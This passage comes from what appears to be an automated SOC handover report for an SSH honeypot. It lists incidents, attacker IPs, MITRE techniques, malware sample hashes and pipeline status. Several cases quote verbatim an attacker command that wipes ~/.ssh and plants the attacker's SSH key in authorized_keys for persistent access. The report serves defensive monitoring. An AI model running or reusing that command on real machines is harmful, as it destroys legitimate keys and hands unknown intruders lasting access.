| `2026-04-15 08:12:12` | `cowrie.log.closed` |
| `2026-04-15 08:12:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.48.243[.]18` to AbuseIPDB if not already reported
- [ ] Block `144.48.243[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4d4d4246065

| Field | Detail |
|---|---|
| **Source IP** | `144.48.243[.]18` |
| **First Seen** | 2026-04-15 08:12 |
| **Last Seen** | 2026-04-15 08:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 08:12:14` | `cowrie.session.connect` |
| `2026-04-15 08:12:14` | `cowrie.client.version` |
| `2026-04-15 08:12:14` | `cowrie.client.kex` |
| `2026-04-15 08:12:14` | `cowrie.login.success` |
| `2026-04-15 08:12:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.48.243[.]18` to AbuseIPDB if not already reported
- [ ] Block `144.48.243[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef73c8095cf9

| Field | Detail |
|---|---|
| **Source IP** | `20.153.204[.]5` |
| **First Seen** | 2026-04-15 08:13 |
| **Last Seen** | 2026-04-15 08:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 08:13:19` | `cowrie.session.connect` |
| `2026-04-15 08:13:19` | `cowrie.client.version` |
| `2026-04-15 08:13:19` | `cowrie.client.kex` |
| `2026-04-15 08:13:20` | `cowrie.login.success` |
| `2026-04-15 08:13:20` | `cowrie.session.params` |
| `2026-04-15 08:13:20` | `cowrie.command.input` |
| `2026-04-15 08:13:20` | `cowrie.command.failed` |
| `2026-04-15 08:13:20` | `cowrie.log.closed` |
| `2026-04-15 08:13:21` | `cowrie.session.params` |
| `2026-04-15 08:13:21` | `cowrie.command.input` |
| `2026-04-15 08:13:21` | `cowrie.session.file_download` |
| `2026-04-15 08:13:21` | `cowrie.log.closed` |
| `2026-04-15 08:13:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.153.204[.]5` to AbuseIPDB if not already reported
- [ ] Block `20.153.204[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e37fc8e49ee2

| Field | Detail |
|---|---|
| **Source IP** | `20.153.204[.]5` |
| **First Seen** | 2026-04-15 08:13 |
| **Last Seen** | 2026-04-15 08:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 08:13:23` | `cowrie.session.connect` |
| `2026-04-15 08:13:23` | `cowrie.client.version` |
| `2026-04-15 08:13:23` | `cowrie.client.kex` |
| `2026-04-15 08:13:24` | `cowrie.login.success` |
| `2026-04-15 08:13:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.153.204[.]5` to AbuseIPDB if not already reported
- [ ] Block `20.153.204[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee2979d3e191

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-04-15 08:14 |
| **Last Seen** | 2026-04-15 08:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 08:14:36` | `cowrie.session.connect` |
| `2026-04-15 08:14:36` | `cowrie.client.version` |
| `2026-04-15 08:14:36` | `cowrie.client.kex` |
| `2026-04-15 08:14:37` | `cowrie.login.success` |
| `2026-04-15 08:14:38` | `cowrie.session.params` |
| `2026-04-15 08:14:38` | `cowrie.command.input` |
| `2026-04-15 08:14:38` | `cowrie.command.failed` |
| `2026-04-15 08:14:38` | `cowrie.log.closed` |
| `2026-04-15 08:14:38` | `cowrie.session.params` |
| `2026-04-15 08:14:38` | `cowrie.command.input` |
| `2026-04-15 08:14:39` | `cowrie.session.file_download` |
| `2026-04-15 08:14:39` | `cowrie.log.closed` |
| `2026-04-15 08:14:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e25abc6212db

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-04-15 08:14 |
| **Last Seen** | 2026-04-15 08:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 08:14:41` | `cowrie.session.connect` |
| `2026-04-15 08:14:41` | `cowrie.client.version` |
| `2026-04-15 08:14:42` | `cowrie.client.kex` |
| `2026-04-15 08:14:43` | `cowrie.login.success` |
| `2026-04-15 08:14:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-623503ad9295

| Field | Detail |
|---|---|
| **Source IP** | `46.101.74[.]113` |
| **First Seen** | 2026-04-15 08:14 |
| **Last Seen** | 2026-04-15 08:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 08:14:54` | `cowrie.session.connect` |
| `2026-04-15 08:14:54` | `cowrie.client.version` |
| `2026-04-15 08:14:54` | `cowrie.client.kex` |
| `2026-04-15 08:14:54` | `cowrie.login.success` |
| `2026-04-15 08:14:55` | `cowrie.session.params` |
| `2026-04-15 08:14:55` | `cowrie.command.input` |
| `2026-04-15 08:14:55` | `cowrie.command.failed` |
| `2026-04-15 08:14:55` | `cowrie.log.closed` |
| `2026-04-15 08:14:55` | `cowrie.session.params` |
| `2026-04-15 08:14:55` | `cowrie.command.input` |
| `2026-04-15 08:14:55` | `cowrie.session.file_download` |
| `2026-04-15 08:14:55` | `cowrie.log.closed` |
| `2026-04-15 08:14:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.74[.]113` to AbuseIPDB if not already reported
- [ ] Block `46.101.74[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-487aac92d22c

| Field | Detail |
|---|---|
| **Source IP** | `46.101.74[.]113` |
| **First Seen** | 2026-04-15 08:14 |
| **Last Seen** | 2026-04-15 08:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 08:14:57` | `cowrie.session.connect` |
| `2026-04-15 08:14:57` | `cowrie.client.version` |
| `2026-04-15 08:14:58` | `cowrie.client.kex` |
| `2026-04-15 08:14:58` | `cowrie.login.success` |
| `2026-04-15 08:14:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.74[.]113` to AbuseIPDB if not already reported
- [ ] Block `46.101.74[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-253e9155adca

| Field | Detail |
|---|---|
| **Source IP** | `20.153.204[.]5` |
| **First Seen** | 2026-04-15 08:15 |
| **Last Seen** | 2026-04-15 08:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 08:15:16` | `cowrie.session.connect` |
| `2026-04-15 08:15:16` | `cowrie.client.version` |
| `2026-04-15 08:15:16` | `cowrie.client.kex` |
| `2026-04-15 08:15:17` | `cowrie.login.success` |
| `2026-04-15 08:15:17` | `cowrie.session.params` |
| `2026-04-15 08:15:17` | `cowrie.command.input` |
| `2026-04-15 08:15:17` | `cowrie.command.failed` |
| `2026-04-15 08:15:18` | `cowrie.log.closed` |
| `2026-04-15 08:15:18` | `cowrie.session.params` |
| `2026-04-15 08:15:18` | `cowrie.command.input` |
| `2026-04-15 08:15:18` | `cowrie.session.file_download` |
| `2026-04-15 08:15:18` | `cowrie.log.closed` |
| `2026-04-15 08:15:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.153.204[.]5` to AbuseIPDB if not already reported
- [ ] Block `20.153.204[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bc0681137ea

| Field | Detail |
|---|---|
| **Source IP** | `20.153.204[.]5` |
| **First Seen** | 2026-04-15 08:15 |
| **Last Seen** | 2026-04-15 08:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 08:15:20` | `cowrie.session.connect` |
| `2026-04-15 08:15:20` | `cowrie.client.version` |
| `2026-04-15 08:15:20` | `cowrie.client.kex` |
| `2026-04-15 08:15:21` | `cowrie.login.success` |
| `2026-04-15 08:15:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.153.204[.]5` to AbuseIPDB if not already reported
- [ ] Block `20.153.204[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf1de9d23670

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-04-15 08:16 |
| **Last Seen** | 2026-04-15 08:16 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 08:16:18` | `cowrie.session.connect` |
| `2026-04-15 08:16:18` | `cowrie.client.version` |
| `2026-04-15 08:16:18` | `cowrie.client.kex` |
| `2026-04-15 08:16:19` | `cowrie.login.success` |
| `2026-04-15 08:16:19` | `cowrie.session.params` |
| `2026-04-15 08:16:19` | `cowrie.command.input` |
| `2026-04-15 08:16:19` | `cowrie.command.failed` |
| `2026-04-15 08:16:20` | `cowrie.log.closed` |
| `2026-04-15 08:16:20` | `cowrie.session.params` |
| `2026-04-15 08:16:20` | `cowrie.command.input` |
| `2026-04-15 08:16:20` | `cowrie.session.file_download` |
| `2026-04-15 08:16:20` | `cowrie.log.closed` |
| `2026-04-15 08:16:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0570c4de0fc6

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-04-15 08:16 |
| **Last Seen** | 2026-04-15 08:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 08:16:23` | `cowrie.session.connect` |
| `2026-04-15 08:16:23` | `cowrie.client.version` |
| `2026-04-15 08:16:23` | `cowrie.client.kex` |
| `2026-04-15 08:16:24` | `cowrie.login.success` |
| `2026-04-15 08:16:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `172.172.196[.]177` | **25** | 2026-04-15 07:34 | 2026-04-15 08:16 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `20.153.204[.]5` | **25** | 2026-04-15 07:27 | 2026-04-15 08:15 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `93.39.209[.]147` | **25** | 2026-04-15 07:32 | 2026-04-15 08:11 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `180.76.176[.]249` | **20** | 2026-04-15 07:27 | 2026-04-15 07:51 | 24m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `144.48.243[.]18` | **16** | 2026-04-15 07:25 | 2026-04-15 08:16 | 0m | 16 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.120[.]130` | **12** | 2026-04-15 07:35 | 2026-04-15 07:53 | 18m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.118[.]145` | **2** | 2026-04-15 07:27 | 2026-04-15 07:29 | 2m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.84[.]166` | **2** | 2026-04-15 07:36 | 2026-04-15 07:38 | 4m | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]229` | **2** | 2026-04-15 07:59 | 2026-04-15 07:59 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.64.105[.]196` | **2** | 2026-04-15 08:16 | 2026-04-15 08:16 | 0m | 0 | `T1592` | 🟢 LOW |
| `113.31.107[.]103` | 1 | 2026-04-15 07:32 | 2026-04-15 07:32 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `121.28.170[.]66` | 1 | 2026-04-15 06:54 | 2026-04-15 06:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.206.32[.]4` | 1 | 2026-04-15 07:36 | 2026-04-15 07:36 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `43.226.47[.]158` | 1 | 2026-04-15 07:25 | 2026-04-15 07:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `46.101.74[.]113` | 1 | 2026-04-15 08:14 | 2026-04-15 08:14 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 41/100 | 🟡 MEDIUM | **29/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 41/100 | 🟡 MEDIUM | **28/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `14.103.120[.]130` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `172.236.228[.]229` | US | Linode | **100** ⚠️ | 50 |
| `14.103.118[.]145` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `20.64.105[.]196` | US | Microsoft Corporation | **100** ⚠️ | 50 |
| `20.153.204[.]5` | JP | Microsoft Corporation | **100** ⚠️ | 22 |
| `43.226.47[.]158` | CN | Shenzhen Qianhai bird cloud computing Co. Ltd. | **100** ⚠️ | 8 |
| `113.31.107[.]103` | CN | Shanghai UCloud Information Technology Company Limited | **100** ⚠️ | 50 |
| `172.206.32[.]4` | US | Microsoft Limited | **100** ⚠️ | 5 |
| `180.76.176[.]249` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 43 |
| `172.172.196[.]177` | US | Microsoft Limited | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 214 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 100 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 80 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 42 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 42 |

---

## 🔕 False Positive Summary (26 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 23 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 242 cases |
| Tool 34  | Credential Extractor        | ✅ 180 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 2 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 19 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 26 filtered (10.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 10 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 80 priority case(s) shown individually · 15 recon entry/entries in table (10 group(s) consolidating 131 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-15T09:25:38Z_
